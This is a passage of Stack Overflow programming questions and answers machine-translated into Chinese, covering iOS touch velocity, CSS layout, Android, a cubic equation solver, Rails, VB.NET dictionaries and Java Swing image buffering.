> 时间：2012-11-11T04:45:51.850
> 
> 标签：ios, cocoa-touch, uiview, uikit, uitouch

我正在编写一个 UIView 子类，它使用该`-touches{Began,Moved,Ended,Cancelled}:withEvent:`方法来跟踪拖动和点击。（我没有使用平移手势识别器，因为它不能仅识别轻按，而且我不使用轻按和平移识别器，因为它们似乎没有以相同的方式在各个阶段中移动。相信我，我已经尝试了两到三遍。）在拖动结束时，我想检查速度并对我正在执行的操作进行微调，如果他们的手指在屏幕仍在移动时离开了屏幕.

问题是，我的速度计算代码出现了一些奇怪的行为。我的触摸处理方法最终都调用了这个简单的速度计算方法：

```
- (void)updateDraggingVelocityWithTouch:(UITouch*)touch {
    NSTimeInterval timespan = touch.timestamp - self.lastDraggingTimestamp;

    CGPoint pt = [touch locationInView:self];

    CGPoint v;
    v.x = (pt.x - self.lastDraggingLocation.x)/timespan;
    v.y = (pt.y - self.lastDraggingLocation.y)/timespan;
    self.draggingVelocity = v;

    NSLog(@"Velocity: %@", NSStringFromCGPoint(v));

    self.lastDraggingLocation = pt;
    self.lastDraggingTimestamp = touch.timestamp;
} 
```

但是，由于某种原因，这似乎计算了平底锅末端的异常高速度，正是我想知道速度的时候。例如：

```
2012-11-10 20:38:02.603 Alef[32850:907] Velocity: {0, 0}
2012-11-10 20:38:02.747 Alef[32850:907] Velocity: {-8.35417, 5.0125}
2012-11-10 20:38:02.763 Alef[32850:907] Velocity: {-30.2068, 0}
2012-11-10 20:38:02.780 Alef[32850:907] Velocity: {-29.7612, 0}
2012-11-10 20:38:02.796 Alef[32850:907] Velocity: {-30.2924, 0}
2012-11-10 20:38:02.863 Alef[32850:907] Velocity: {-7.48297, 0}
2012-11-10 20:38:02.930 Alef[32850:907] Velocity: {-7.526, 0}
2012-11-10 20:38:03.030 Alef[32850:907] Velocity: {-4.99497, 0}
2012-11-10 20:38:03.432 Alef[32850:907] Velocity: {-40.5009, 40.5009} 
```

有时它甚至更高——我已经看到在滑动时结束速度超过 100，否则从未达到 15。

知道为什么会发生这种情况吗？我应该使用与我在这里展示的简单差异不同的算法吗？

# html - 在浏览器调整大小后浮动后将 div 居中

> ID：13328665
> 
> 赞同：3
> 
> 时间：2012-11-11T04:45:58.903
> 
> 标签：html, css, media-queries

我有以下html-

```
 <div class="container">
  <h1 class="page-header" id="property_head">A cool title</h1> 
  <div class="row text_img">
    <div class="span9">
      <div class="row">
        <div class="span3" id="activity"><img src="http://some/img.png"></div>
        <div class="span5" id="activity_text"><h3 class="text_title">Great Title</h3><br><p class="lead">Foo</p></div>
      </div>
    </div>  
  </div>
 </div> 
```

和以下css-

```
.text_img {
  padding: 30px;
  margin-bottom: 30px;
  margin-left: 100px;

}

#activity {
  float: left;
  margin-right: 30px;
}

#activity_text {
  float: right;
  border:1px solid black;
} 
```

我正在为`container` `page-header` `row`and使用引导程序`span3/5`。当我将浏览器的大小调整为 ex 300px 时`#activity_text`，它自己位于下面`#activity`，这就是我想要的。

我正在使用媒体查询，并且我希望将自身定位在 img 下方的文本分解时，让 img 在文本上方居中并在下面的所有宽度中保持这种方式（使用媒体查询）。

在尝试了多种方法之后，我不确定 CSS 是否能够完成这项工作。感谢您的关注。看看附件。![在此处输入图像描述](../Images/77a805dad6f122856aa46e9dcc5ad3c6.png) ![在此处输入图像描述](../Images/f5eadb55af091d3246ab866d5b056092.png)

注意：更改背景颜色以帮助注意媒体查询断点

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:42:27.890

在特定的媒体查询中，您只需要删除任何浮动，给它一个宽度和边距：自动。例如在您想要的媒体查询最大宽度：

```
#activity {
    float:none;
    width:50%; /* or whatever you want it to be */
    margin:auto;
} 
```

根据 Bootstrap CSS 的设置方式，您可能必须添加`!important`到上面的一个或所有 CSS 中，以确保它在该媒体查询点执行您希望它执行的操作。

此外，我不确定 activity_text 是否在那时自动进入下方，所以这是您在同一个媒体查询中需要的 CSS 才能工作：

```
#activity_text {
    float:none;
    width:100%;
} 
```

# java - Android设备：“新ServerSocket（6000）”上的权限被拒绝异常

> ID：13328669
> 
> 赞同：2
> 
> 时间：2012-11-11T04:48:21.920
> 
> 标签：java, android, network-programming

我`new ServerSocket(6000)`在 android 设备的线路上收到“Permission Denied”异常。

我已经阅读了许多帖子，其中说您必须`android.permission.INTERNET`在清单中添加权限。我已经获得了此权限，但我仍在收到此消息。

# android - 根据android中的屏幕尺寸计算图像尺寸

> ID：13328673
> 
> 赞同：2
> 
> 时间：2012-11-11T04:49:20.053
> 
> 标签：android, dynamic, image-processing

我正在尝试根据屏幕尺寸计算图像高度和宽度。我从后端获取 5'x 7' 尺寸的图像，为了转换像素乘以 72，我有 360 X 504 尺寸的图像。对于 360 X 504 ，我的动态透明矩形区域将出现在 (1.223') x (1.179') 即 88.05 x 84.88 处。现在对于屏幕尺寸 320 x 480，我想计算我的动态矩形区域的高度和宽度。为此，我使用以下计算：

对于高度：

新高度 = (84.88/504)*480 = 80.83

其中 84.88 - 矩形图像高度， 504 - 屏幕尺寸高度， 480 - 新屏幕尺寸高度。

宽度相同的方式：

新宽度= (88.05/360)*320 = 78.26

当屏幕尺寸增加或减少时，这是计算图像尺寸的方法吗？我需要将动态图像准确地放置在主背景图像的矩形区域（棕色区域）上。

简而言之，我将获得**360X504 的图像 x、y 位置和高度、宽度**.. 现在我需要计算**320x480 的 x、y 和高度、宽度**

![在此处输入图像描述](../Images/dc3594ebb6dc8ba47d1201919d340a44.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T05:19:15.920

为什么不在 /drawables/ldpi 中预先配置它们？

这样，当你在你想要的地方给按钮充气时，它会自动发生。

您还可以使用：

API3+

```
Display display = getWindowManager().getDefaultDisplay();
Point size = new Point();
display.getSize(size);
int width = size.x;
int height = size.y; 
```

API1+（虽然现在在较新的 API 中已弃用）

```
Display display = getWindowManager().getDefaultDisplay(); 
int width = display.getWidth(); 
int height = display.getHeight(); 
```

要获取显示尺寸，并且由于您现在知道显示信息，您可以通过名称（small.jpg、smaller.jpg）选择要为哪个 /drawable 元素充气，并使用小 case/switch 语句来处理奇怪的屏幕尺寸在该类别的屏幕中。这将让它一直工作并正确自动调整大小。

这会让人头疼，因为系统已经知道 dpi 和屏幕类别（“large”、“x-large”等），系统为您完成了艰苦的工作！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T05:51:56.367

如果您可以预先定义布局中的位置，那么您可能可以根据配置创建不同的布局

*   低密度脂蛋白
*   mdpi
*   ETC

并设置`scaleType`.`ImageView`

以后每当您从服务器获取图像时，只需将其设置为视图，它将自动管理缩放，包括设备 dpi。

# c++ - C++：求解三次方程

> ID：13328676
> 
> 赞同：2
> 
> 时间：2012-11-11T04:50:03.137
> 
> 标签：c++, c, equation, solver, cubic

这个[网站](http://easycalculation.com/algebra/learn-cubic-equation.php)解决三次方程，并有它使用的方程

我编写了这个函数来获得相同的结果，但它不起作用

```
void cubicFormula(float a, float b, float c, float d, float *results)
{
    float a2 = a*a;
    float b2 = b*b;
    float b3 = b2*b;

    float q = (3*c- b2)/9;
    float q2 = q*q;
    float q3 = q2*q;
    float r = -27*d + b*(9*c-2*b2);
    float r2 = r*r;

    float discriminant = q3 + r2;

    float s = r + sqrtf(discriminant);
    float t = r - sqrtf(discriminant);

    float term1 = powf((-t + s)/2, 1/3.);

    float r13= 2 * sqrtf(q);

    results[0] = (- term1 + r13 * cosf(q3/3));
    results[1] = (- term1 + r13 * cosf(q3 + (2*M_PI)/3));
    results[2] = (- term1 + r13 * cosf(q3 + (4*M_PI)/3));
} 
```

可能是什么问题，我有什么遗漏吗？

**更新：**

例如，使用这些值

```
a = -1.000000;
b = 36.719475;
c = -334.239960;
d = 629.877808; 
```

判别式小于零，所以**r13**是**nan**

但是上面提到的网站和我测试过的几个在线求解器找到了三个根源

```
23.775687816485593
2.548516232734247
10.395270950780164 
```

都是实数

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-11T05:13:07.283

您链接以提供[三次方程计算器](http://easycalculation.com/algebra/cubic-equation.php)的站点。您可以从寻找您的代码和他们的代码之间的差异开始：

```
function cubicsolve(dataForm)
{
    var a = parseFloat(dataForm.aIn.value);
    var b = parseFloat(dataForm.bIn.value);
    var c = parseFloat(dataForm.cIn.value);
    var d = parseFloat(dataForm.dIn.value);
    if (a == 0)
    {
        alert("The coefficient of the cube of x is 0\. Please use the utility for a SECOND degree quadratic. No further action taken.");
        return;
    } //End if a == 0

    if (d == 0)
    {
        alert("One root is 0\. Now divide through by x and use the utility for a SECOND degree quadratic to solve the resulting equation for the other two roots. No further action taken.");
        return;
    } //End if d == 0
    b /= a;
    c /= a;
    d /= a;
    var disc, q, r, dum1, s, t, term1, r13;
    q = (3.0*c - (b*b))/9.0;
    r = -(27.0*d) + b*(9.0*c - 2.0*(b*b));
    r /= 54.0;
    disc = q*q*q + r*r;
    dataForm.x1Im.value = 0; //The first root is always real.
    term1 = (b/3.0);
    if (disc > 0) { // one root real, two are complex
        s = r + Math.sqrt(disc);
        s = ((s < 0) ? -Math.pow(-s, (1.0/3.0)) : Math.pow(s, (1.0/3.0)));
        t = r - Math.sqrt(disc);
        t = ((t < 0) ? -Math.pow(-t, (1.0/3.0)) : Math.pow(t, (1.0/3.0)));
        dataForm.x1Re.value = -term1 + s + t;
        term1 += (s + t)/2.0;
        dataForm.x3Re.value = dataForm.x2Re.value = -term1;
        term1 = Math.sqrt(3.0)*(-t + s)/2;
        dataForm.x2Im.value = term1;
        dataForm.x3Im.value = -term1;
        return;
    } 
    // End if (disc > 0)
    // The remaining options are all real
    dataForm.x3Im.value = dataForm.x2Im.value = 0;
    if (disc == 0){ // All roots real, at least two are equal.
        r13 = ((r < 0) ? -Math.pow(-r,(1.0/3.0)) : Math.pow(r,(1.0/3.0)));
        dataForm.x1Re.value = -term1 + 2.0*r13;
        dataForm.x3Re.value = dataForm.x2Re.value = -(r13 + term1);
        return;
    } // End if (disc == 0)
    // Only option left is that all roots are real and unequal (to get here, q < 0)
    q = -q;
    dum1 = q*q*q;
    dum1 = Math.acos(r/Math.sqrt(dum1));
    r13 = 2.0*Math.sqrt(q);
    dataForm.x1Re.value = -term1 + r13*Math.cos(dum1/3.0);
    dataForm.x2Re.value = -term1 + r13*Math.cos((dum1 + 2.0*Math.PI)/3.0);
    dataForm.x3Re.value = -term1 + r13*Math.cos((dum1 + 4.0*Math.PI)/3.0);
    return;
}  //End of cubicSolve 
```

# visual-c++ - 错误 C2143：语法错误：缺少“；” 在'->'之前

> ID：13328677
> 
> 赞同：0
> 
> 时间：2012-11-11T04:50:08.483
> 
> 标签：visual-c++

在下面的程序中，我收到以下错误：

```
error C2143: syntax error : missing ';' before '->'  
error C2143: syntax error : missing ';' before '->' 
```

任何猜测我做错了什么？

```
#include "stdafx.h"
#include <stdio.h>
#using <system.drawing.dll>
using namespace System;
using namespace System::Drawing;
int main()
{       
Image^ newImage = Image::FromFile( "SampImag.jpg" );
// Create parallelogram for drawing image.
Point ulCorner = Point(100,100);
Point urCorner = Point(325,100);
Point llCorner = Point(150,250);
array<Point>^ destPara = {ulCorner,urCorner,llCorner};
// Create rectangle for source image.
Rectangle srcRect = Rectangle(50,50,150,150);
GraphicsUnit units = GraphicsUnit::Pixel;
// Draw image to screen.
    //Graphics1 = new Graphics();  
     Graphics->DrawImage( newImage, destPara, srcRect, units );
   return 0;
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:33:39.053

问题是您只能在 Graphics 类的实例上调用 DrawImage。

但问题是 Graphics 类是一个抽象类，并且控制台应用程序没有关联的 Graphics 对象。[这篇 MSDN 文章](http://msdn.microsoft.com/en-us/library/5y289054%28v=vs.100%29.aspx)提供了一些有关如何使用 Graphics 类的信息。首先使用 Graphics 类创建一个工作 C# 控制台应用程序，然后将其转换为 C++/CLI。这将是解决此问题的更简单方法。

如果允许，请尝试使用 VS 2012 创建 C++/CLI 应用程序，因为它为 C++/CLI 项目提供智能感知。

# ruby-on-rails - 管理命名空间的 Rails 资源路由，生成表单时出错

> ID：13328678
> 
> 赞同：0
> 
> 时间：2012-11-11T04:50:08.453
> 
> 标签：ruby-on-rails, ruby-on-rails-3, activerecord, simple-form, rails-routing

我在带有控制器`admin`的路由中有一个命名空间：`users`

```
namespace :admin do
   resources :users
end 
```

所以我在 /admin 文件夹中有 users_controller.rb 和一个用户模型。在我的 _form 部分中，我试图为新操作和编辑操作创建一个表单，但是当我尝试使用它来创建它时：

> = simple_form_for @user 做 |f|

我在编辑和新操作中都收到错误消息：

```
ActionView::Template::Error (undefined method `user_path' for... 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T05:07:39.847

只需尝试以下形式，

```
= simple_form_for [:admin, @user] do |f| 
```

# java - 使用嵌套静态类作为外部类的 ActionListener

> ID：13328683
> 
> 赞同：0
> 
> 时间：2012-11-11T04:51:18.343
> 
> 标签：java, actionlistener, static-members, nested-class

我想使用嵌套的静态类作为`actionListener`封闭类的 GUI 元素。我做了这样的事情：

```
public class OuterClass {

    public static void myImplementation() {
        OuterClass.StartupHandler startupHandler = new OuterClass.StartupHandler();
        exitMenuItem.addActionListener(startupHandler); // error Line
    }

    public static class StartupHandler implements ActionListener {

   @Override
    public void actionPerformed(ActionEvent e) {
        //throw new UnsupportedOperationException("Not supported yet.");

        if (e.getSource() == exitMenuItem) {
            System.exit(1);
        } else if (e.getSource() == helpMenuItem) {
            // show help menu
        }
    }
}
} 
```

但是当我调用此代码时，我`NullPointerException`在 //error Line 处得到了。这是执行此操作的正确方法还是我缺少某些东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:54:56.413

正在`exitMenuItem`初始化吗？我敢打赌是`null`。

如果您包含更多类（例如您声明的位置`exitMenuItem`），我们将更容易地指出问题。

# git - 如何用 libgit2 做相当于 'git rm' 的操作？

> ID：13328686
> 
> 赞同：1
> 
> 时间：2012-11-11T04:51:53.990
> 
> 标签：git, libgit2

使用 libgit2，我可以做相当于`git add`with `git_index_add`，但我正在努力弄清楚如何在`git rm`已删除的文件上实现相当于。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T07:02:38.180

你用这个[`git_index_remove`](http://libgit2.github.com/libgit2/#HEAD/group/index/git_index_remove)函数来做到这一点。作为阶段，您可能需要 0（假设您不处理冲突）。文件是否存在于文件系统中并不重要。

# javascript - ajax加载后调用.js文件

> ID：13328698
> 
> 赞同：0
> 
> 时间：2012-11-11T04:54:13.637
> 
> 标签：javascript, jquery, ajax

我正在尝试将 .js 文件应用于我通过 ajax 加载的页面（因为 ajax 会自动剥离所有 javascript 的内容）。

```
var url;
var textUrl = 'local/file.js';

$('a').click(function() {
    url = $(this).attr('href');
    $('.secondaryDiv').load(url, function() {
        $.getScript(textUrl, function(data, textStatus, jqxhr) {
        console.log(data); //data returned from getScript
        console.log(textStatus); //return "success"
        console.log(jqxhr.status); //200
        });
    });
return false;
}); 
```

我以正确的方式接近这个吗？我尝试了我能想到的一切，但我无法让它发挥作用

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:24:12.197

您可以创建一个新`<script>`元素并以编程方式将其`src`属性设置为指向正确的文件：

```
var url;
var textUrl = 'local/file.js';

$(document).ready(function() {
    $('a').click(function() {
        url = $(this).attr('href');
        $('.secondaryDiv').load(url, function() {
            var s = $('<script>', {
                type: 'text/javascript'
            });
            $(this).append(s);
            s[0].src = textUrl;
        });
        return false;
    });
});​ 
```

# arrays - 在 VB.NET 中获取字典的长度

> ID：13328701
> 
> 赞同：3
> 
> 时间：2012-11-11T04:55:23.407
> 
> 标签：arrays, vb.net, linq, dictionary

我想检索 Dictionary 数组中有多少项：

![在此处输入图像描述](../Images/d62bc53f68ec3e3461c0f857afb18799.png)

但是执行以下操作似乎不会产生应有的**4**：

```
Dim showNumber As Integer = tmpShows.Length 
```

我拥有的字典的代码是这样的：

```
Dim all = New Dictionary(Of String, Object)()
Dim info = New Dictionary(Of String, Object)()

info!Station = .SelectSingleNode(".//span[@class='channel']").ChildNodes(3).ChildNodes(2).InnerText
info!Shows = From tag In .SelectNodes(".//a[@class='thickbox']")
             Select New With {.Show = tag.Attributes("title").Value, .Link = tag.Attributes("href").Value}

Dim tmpShows = all.Item(info!Station)
Dim showNumber As Integer = tmpShows.Length 
```

为了获得我正在寻找的**4长度，我缺少什么？**

![在此处输入图像描述](../Images/a98c2cd963aab875407d6adc3752070e.png)

![在此处输入图像描述](../Images/5be4812950ca1499cb1a792802724737.png)

![在此处输入图像描述](../Images/b6b6181d47cce23aa7915d9fc8b248c2.png)

![在此处输入图像描述](../Images/9631fbc75c19757fe38163913b202fa8.png)

```
 Dim all = New Dictionary(Of String, Object)()

    For Each channel In doc.DocumentNode.SelectNodes(".//div[@class='channel_row']")
        Dim info = New Dictionary(Of String, Object)()
        skipFirstShow = False

        With channel
            info!Logo = .SelectSingleNode(".//img").Attributes("src").Value
            info!Channel = .SelectSingleNode(".//span[@class='channel']").ChildNodes(3).ChildNodes(0).InnerText
            info!Station = .SelectSingleNode(".//span[@class='channel']").ChildNodes(3).ChildNodes(2).InnerText

            Dim style As String = .SelectSingleNode(".//span[2]").Attributes("style").Value

            If InStr(style.ToLower, "width: 0px;") <> 0 Then skipFirstShow = True

            info!Shows = From tag In .SelectNodes(".//a[@class='thickbox']")
                         Select New With {.Show = tag.Attributes("title").Value, .Link = tag.Attributes("href").Value}
            'Select New With {.Show = tag.Attributes("title").Value, .Link = tag.Attributes("href").Value}
        End With

        all.Add(info!Station, info.Item("Shows"))
        theLogoURL(theCount) = "https://example.org" & Trim(info.Item("Logo"))
        theChannelNum(theCount) = Trim(info.Item("Channel"))
        theStationCallLetters(theCount) = Trim(info.Item("Station"))

        Dim Shows As String = ""
        Dim ShowsDetail As String = ""
        Dim tmpShows = all.Item(info!Station) 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-11T05:15:50.223

使用*Count*而不是*length*。

**例子：**

```
Dim showNumber As Integer = tmpShows.Count 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T01:47:41.083

我这样做只是为了让我的计数......

```
 Dim intXShows As Integer = 0

 For Each item In tmpShows
    intXShows += 1
 Next 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-14T16:39:42.523

尝试像这样更改您的声明：

```
Dim all as New Dictionary(Of String, Object)() 
```

代替：

```
Dim all = New Dictionary(Of String, Object)() 
```

然后调用`Count`,`Length`等。

还可以尝试使用`ForEach`循环来获取`all`变量的计数。

# .net - SystemInformation.PowerStatus.BatteryLifeRemaining 返回 -1？

> ID：13328702
> 
> 赞同：0
> 
> 时间：2012-11-11T04:55:26.583
> 
> 标签：.net, vb.net, power-management, system-information

在我的代码中，我有：

```
Dim ps as PowerStatus = SystemInformation.PowerStatus
Dim batteryTimeLeft as Integer = ps.BatteryLifeRemaining 'I have a problem here

MsgBox("Time left on battery: " & cstr(batteryTimeLeft),vbInformation,"Info") 
```

`PowerStatus.BatteryLifeRemaining`当我有电池存在并使用或不使用时，总是返回 -1。为什么这总是返回-1？

我目前在 VB.NET 2010 Express 上使用 MS .NET 4.0 客户端配置文件。我拔下笔记本电脑的插头，看看它是否有影响，但没有。也试过插上。

请帮忙？？？

**编辑：**没关系，现在除了-1之外我无法`PowerStatus.BatteryFullLifetime`返回。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:27:55.010

您是否尝试在没有电池的台式机上测试您的应用程序？如果是，那可能是您得到 -1 的原因，因为它不适用。

您可以尝试在笔记本电脑上运行您的应用程序吗？

# ios - iOS UITableViewCell UIImageView 在不同条件下的设置

> ID：13328703
> 
> 赞同：0
> 
> 时间：2012-11-11T04:55:26.887
> 
> 标签：ios, uitableview, uiapplicationdelegate

我有一个应用程序，`UITableView`在我`Cells`的应用程序中有一个，`UIImageViews`并且`UILabels`可以更改图像/文本颜色的白天主题和夜间主题（尝试自动设置）。

我的问题是我在填充表格时设置图像和颜色，`cellForRowAtIndexPath`并且在白天“主题”，然后如果我在晚上“主题”几个小​​时后重新打开应用程序并且应用程序仍然在“背景”中并且不需要重新加载（即`viewDidLoad`不触发），“主题”显示的那一天，直到我滚动`UITableView`，然后当新单元格通过滚动进入视图时显示“主题”。

当一天中的时间改变时，我应该如何在我的单元格中设置对象？我正在考虑使用`NSTimer`，但我不确定如何更新单元格中的对象。我也在考虑使用适当的方法`AppDelagate`来启动事物，但是有没有办法强制重新加载`TableView`？

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:04:06.643

您需要使用 applicationWillEnterForeground: 并在表视图上调用 reloadData。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T05:04:57.583

你可以在被调用`[tableView reloadData]`时`viewWillAppear`调用。viewDidLoad 对您来说不会经常发生，您真正想要的是在视图即将出现给用户时刷新。

您还可以检查`applicationWillEnterForeground`您的应用程序委托并向您的视图控制器发出信号以通过这种方式重新加载其表格视图。

# java - Java - Lists 和 Graphics2D 的分层问题

> ID：13328707
> 
> 赞同：0
> 
> 时间：2012-11-11T04:55:56.207
> 
> 标签：java, swing, list, jpanel, java-2d

所以我有一个扩展 JPanel 的 DisplayPanel 类，它还使用 Graphics2D 为我的程序绘制大量图像。为了能够轻松地自定义使用它，我对其进行了设置，以便每次重新绘制面板时它都使用一个列表，我可以在程序处理时添加或删除它。我的问题是分层。我遇到了一个问题，列表必须达到它的大小调整点（或类似的东西），所以我想要显示的图像最终位于屏幕上所有其他图像的下方。我来到社区寻求答案，因为我相信你会提供一个好的答案。

问题图片：只有远角的图片被鼠标高亮。其余部分的亮点在下面......（http://imgur.com/LY41q）

来自 DisplayPanel 的代码：

```
@Override
public void paintComponent(Graphics g) {
    super.paintComponent(g);
    Graphics2D g2d = (Graphics2D) g;
    g2d.clearRect(0, 0, 800, 640);
    for(int i = 0; i < images.size(); i++) g2d.drawImage(
            images.get(i).getImage(), images.get(i).getX(), 
            images.get(i).getY(), null);
}

public void paintImage(ImageMap[] images, ImageMap[] clearImages, boolean clear) {
    if(clear) this.images.clear();
    else if(clearImages!=null) for(int i = 0; i < clearImages.length; i++) this.images.remove(clearImages[i]);
    if(images!=null) for(int i = 0; i<images.length; i++) this.images.add(images[i]);            
    refresh();
} 
```

游戏代码：

```
 private void handleMoveClick(int identity) {

    int index = -1;
    if(identity >=0 && identity < 36) {
        System.out.println(identity);
        index = identity;
        identity = 0;
    }

    switch(identity) {

        case startButtonIdentity:
            if(!tempButtonImages.contains(startButtonLight)) {
                tempButtonImages.add(startButtonLight);
                display.panel.addImage(startButtonLight);
            }
            break;

        case 0:
            if(!tempButtonImages.contains(field.getFieldHighlightImageAt(index))) {
                tempButtonImages.add(field.getFieldHighlightImageAt(index));
                display.panel.addImage(field.getFieldHighlightImageAt(index));
            }
            break;

        default:
            ImageMap[] tempImages = tempButtonImages.toArray(new ImageMap[tempButtonImages.size()]);
            for(int i = 0; i<tempImages.length; i++) {
                display.panel.removeImage(tempImages[i]);
            }
            tempButtonImages.clear();
            break;
    } 
```

创建高亮图像的位置

现场代码：

```
public void makeFieldHighlightImages() {
    fieldHighlightImages = new ImageMap[fieldTable.length*fieldTable[0].length];
    for(int i = 0; i < fieldTable.length; i++)
        for(int j = 0; j < fieldTable[0].length; j++)
            fieldHighlightImages[i*fieldTable[0].length+j] = 
                    new ImageMap(Deck.getCardImage(56), 
                    startX+j*horizontalSpacing, 
                    startY+i*verticalSpacing);
}

public ImageMap getFieldHighlightImageAt(int index) {
    System.out.println(fieldHighlightImages[index].getImage() + " " + fieldHighlightImages[index].getX() + " " + fieldHighlightImages[index].getY());
    return fieldHighlightImages[index];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:01:55.567

可能更容易的是使用某种后备缓冲区，并且仅在发生变化时才对其进行绘制。

这意味着对paintComponent 的调用仅绘制后备缓冲区，使其更快，并且如果列表变得很大，将允许在第二个线程中绘制后备缓冲区。

**更新了示例**

![在此处输入图像描述](../Images/ecaf9f000beed5dc9b60beabf9ac7a81.png)

```
public class BackingBuffer {

    public static void main(String[] args) {
        new BackingBuffer();
    }

    public BackingBuffer() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException ex) {
                } catch (InstantiationException ex) {
                } catch (IllegalAccessException ex) {
                } catch (UnsupportedLookAndFeelException ex) {
                }

                File[] imageFiles = new File("D:/hold/ScaledImages").listFiles(new FileFilter() {
                    @Override
                    public boolean accept(File pathname) {
                        String name = pathname.getName().toLowerCase();
                        return name.endsWith(".png") || name.endsWith(".jpg") || name.endsWith(".gif");
                    }
                });

                ImagesPane imagesPane = new ImagesPane();
                for (File file : imageFiles) {
                    try {
                        BufferedImage image = ImageIO.read(file);
                        imagesPane.addImage(image);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                JFrame frame = new JFrame("Testing");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.setLayout(new BorderLayout());
                frame.add(imagesPane);
                frame.pack();
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);
            }
        });
    }

    public class ImagesPane extends JPanel {

        private BufferedImage backingBuffer;
        private List<Image> images;
        private Timer updateTimer;

        public ImagesPane() {
            images = new ArrayList<Image>(25);
            updateTimer = new Timer(125, new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    updateBuffer();
                    repaint();
                }
            });
            updateTimer.setRepeats(false);
            updateTimer.setCoalesce(true);
        }

        public void addImage(Image image) {
            // You could devise some kind of algorithim to determine if was possible
            // to image the image into the existing backing buffer or not.
            // It would save having to recreate the backing buffer unless it
            // really was required...
            images.add(image);
            invalidate();
        }

        public void removeImage(Image image) {
            images.remove(image);
            invalidate();
        }

        @Override
        public Dimension getPreferredSize() {
            return new Dimension(400, 400);
        }

        protected void updateBuffer() {
            if (backingBuffer == null || backingBuffer.getWidth() != getWidth() || backingBuffer.getHeight() != getHeight()) {
                if (getWidth() > 0 && getHeight() > 0) {
                    backingBuffer = new BufferedImage(getWidth(), getHeight(), BufferedImage.TYPE_INT_ARGB);
                }
            }
            if (backingBuffer != null) {
                Graphics2D g2d = backingBuffer.createGraphics();
                int y = 0;
                int x = 0;
                int rowHeight = 0;
                for (Image image : images) {
                    rowHeight = Math.max(image.getHeight(this), rowHeight);
                    if (x + image.getWidth(this) > getWidth() && x != 0) {
                        x = 0;
                        y += rowHeight;
                    }
                    g2d.drawImage(image, x, y, this);
                    x += image.getWidth(this);
                    if (x > getWidth()) {
                        x = 0;
                        y += rowHeight;
                        rowHeight = 0;
                    }
                }
                g2d.dispose();
            }
        }

        @Override
        public void invalidate() {
            // This method can be called repeatly in quick sucession, rather then
            // reacting to each call, I want to delay performing the update,
            // which might be costly in time and memory until it's all settled down
            // a little...
            super.invalidate();
            updateTimer.restart();
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            if (backingBuffer != null) {
                g.drawImage(backingBuffer, 0, 0, this);
            }
        }
    }
} 
```

现在，如果您想使用某种后台线程，我可能会使用[`SwingWorker`](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/worker.html). 您真正需要的唯一额外是您可以提出某种标志，以便您知道工作人员正在更新缓冲区（因为工作人员是不可重入的（同一实例不能运行两次））

工作人员将创建一个新的临时缓冲区，它可以工作，因为您不想干扰当前用于在屏幕上绘制的缓冲区（或者您最终会得到脏颜料），一旦完成，您可以切换方法中的缓冲区`done`并调用`repaint`组件以使其在屏幕上更新...

**更新选择突出显示**

![在此处输入图像描述](../Images/747ee52d0657fed3495d027607841516.png)

您可以直接在后备缓冲区中突出显示每个图像，但我个人认为这是一项昂贵的练习，因为您需要在每次单击时更新后备缓冲区。

更好的方法是保持一个`Map`图像边界键控回单个图像。当您更新缓冲区时，您将重新创建此地图。

使用此地图，您可以确定是否单击了任何“图像”。然后我会将图像的引用放入一个列表中，然后在绘制组件时使用它......

```
public class BackingBuffer {

    public static void main(String[] args) {
        new BackingBuffer();
    }

    public BackingBuffer() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException ex) {
                } catch (InstantiationException ex) {
                } catch (IllegalAccessException ex) {
                } catch (UnsupportedLookAndFeelException ex) {
                }

                File[] imageFiles = new File("C:/hold/ScaledImages").listFiles(new FileFilter() {
                    @Override
                    public boolean accept(File pathname) {
                        String name = pathname.getName().toLowerCase();
                        return name.endsWith(".png") || name.endsWith(".jpg") || name.endsWith(".gif");
                    }
                });

                ImagesPane imagesPane = new ImagesPane();
                for (File file : imageFiles) {
                    try {
                        BufferedImage image = ImageIO.read(file);
                        imagesPane.addImage(image);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                JFrame frame = new JFrame("Testing");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.setLayout(new BorderLayout());
                frame.add(imagesPane);
                frame.pack();
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);
            }
        });
    }

    public class ImagesPane extends JPanel {

        private Map<Image, Rectangle> mapBounds;
        private BufferedImage backingBuffer;
        private List<Image> images;
        private Timer updateTimer;
        private List<Image> selected;

        public ImagesPane() {
            images = new ArrayList<Image>(25);
            selected = new ArrayList<Image>(25);
            updateTimer = new Timer(125, new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    updateBuffer();
                    repaint();
                }
            });
            updateTimer.setRepeats(false);
            updateTimer.setCoalesce(true);

